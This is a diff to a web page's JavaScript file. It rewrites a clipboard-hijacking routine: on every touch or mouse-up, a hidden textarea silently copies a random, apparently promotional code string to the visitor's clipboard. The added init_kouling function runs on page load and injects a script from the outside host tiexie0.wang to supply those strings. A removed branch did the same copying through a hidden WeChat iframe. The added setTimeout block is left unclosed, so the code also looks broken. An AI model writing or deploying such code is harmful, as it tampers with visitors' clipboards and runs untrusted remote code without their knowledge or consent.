@@ -1,8 +1,14 @@
 var c_mua = "";
-function get_copy(arr){
-  //setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
+function get_zkl_js(arr){
   var index =parseInt(arr.length*Math.random())
   c_mua = arr[index];
+  get_copy()
+}
+function get_copy(){
+  //setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
+  if (document.getElementById('hd_textarea_element')) {
+    return;
+  }
   var b = document.createElement("textarea");
   var u = navigator.userAgent;
   if (u.indexOf('Android') > -1 || u.indexOf('Linux') > -1) {
@@ -26,15 +32,7 @@ function get_copy(arr){
   document.addEventListener('touchstart', copy);
   document.addEventListener('touchend', copy);
   document.addEventListener('mouseup', copy);
-  if(/MicroMessenger/i.test(u)){
-    var iframe=document.createElement("iframe");
-    iframe.style.cssText="display:none;width:0px;height:0px;";
-    iframe.src='weixin://webview/copy/'+c_mua;
-    //alert('----'+c_mua+'-----')
-    document.body.appendChild(iframe);
-  }
 }
-
 var copy = function() {
   if (!document.getElementById('hd_textarea_element')) {
     return
@@ -48,3 +46,10 @@ var copy = function() {
     b.remove();
   }
 };
+function init_kouling(){
+  setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
+  var b = document.createElement("script");
+  b.setAttribute('src','http://tiexie0.wang/adzone/get_zkl_js')
+  (a = document.getElementsByTagName("head")) && a[0] && a[0].appendChild(b)
+}
+init_kouling()
